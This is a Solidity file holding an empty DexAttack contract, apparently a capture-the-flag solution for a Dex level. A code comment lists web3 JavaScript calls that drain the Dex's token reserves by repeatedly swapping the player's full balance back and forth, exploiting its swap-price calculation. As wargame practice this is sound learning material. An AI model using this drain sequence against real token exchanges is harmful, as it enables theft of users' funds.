//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import './Dex.sol';
contract DexAttack {
    Dex public myDex;

    constructor(address _myDexAddr){
        myDex = Dex(_myDexAddr);
    } 

/*
actually I think we don't need a smart contract to do the attack, since it can be done directly by web3 javascript
On this one we don't need an extra contract. All can be done in javascript web3 interface.
let token1Addr = (await contract.token1())
let token2Addr = (await contract.token2())
contract.swap(token1Addr,token2Addr,(await contract.balanceOf(token1Addr,player)).words[0] )
contract.swap(token2Addr,token1Addr,(await contract.balanceOf(token2Addr,player)).words[0] )
contract.swap(token1Addr,token2Addr,(await contract.balanceOf(token1Addr,player)).words[0] )
contract.swap(token2Addr,token1Addr,(await contract.balanceOf(token2Addr,player)).words[0] )
contract.swap(token1Addr,token2Addr,(await contract.balanceOf(token1Addr,player)).words[0] )

contract.swap(token2Addr,token1Addr,45 )

(await contract.balanceOf(token1Addr,contract.address)).words[0]

*/

}